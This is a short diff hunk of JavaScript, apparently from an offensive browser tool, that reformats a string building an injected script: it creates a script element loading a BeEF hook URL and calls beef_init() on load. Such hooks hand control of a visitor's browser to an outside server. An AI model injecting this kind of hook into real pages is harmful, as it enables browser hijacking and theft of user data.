@@ -778,7 +778,8 @@ $(function() {
             al("Cancelled BeEF hooking");
             return;
         }
-        var step1 = "(function() {\n var d=document;\n\
+        var step1 = "(function() {\n\
+var d=document;\n\
 var s = d.createElement('script');\n\
 s.src = " + JSON.stringify(beef) + "; // BeEF hook here\n\
 s.setAttribute('onload','beef_init();');\n\
